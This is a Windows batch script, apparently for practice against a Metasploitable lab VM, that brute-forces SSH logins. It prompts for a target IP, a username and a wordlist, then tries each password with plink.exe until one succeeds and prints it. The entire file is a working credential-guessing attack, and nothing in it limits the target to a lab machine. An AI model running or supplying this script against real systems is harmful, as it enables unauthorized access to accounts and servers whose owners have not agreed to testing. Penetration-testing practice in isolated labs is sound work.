@echo off
title SSH Bruteforce - Metasploitable VM
color A
setlocal enabledelayedexpansion

:: Input
set /p ip="Enter Metasploitable IP: "
set /p user="Enter Username: "
set /p wordlist="Enter full path of Password List: "

:: Remove quotes if user typed them
set wordlist=%wordlist:"=%

:: Check if password file exists
if not exist "%wordlist%" (
    echo File not found: %wordlist%
    pause
    exit /b
)

:: Counter for attempts
set /a count=1

:: Loop through each password
for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    echo [ATTEMPT !count!] Trying password: !pass!
    
    :: Attempt SSH login using plink
    plink.exe -ssh %user%@%ip% -pw "!pass!" -batch exit >nul 2>&1
    
    :: Check if login succeeded
    if !errorlevel! EQU 0 (
        echo.
        echo SUCCESS! Password found: !pass!
        pause
        exit /b
    )
    
    set /a count+=1
)

echo.
echo No valid password found in the list.
pause
exit /b
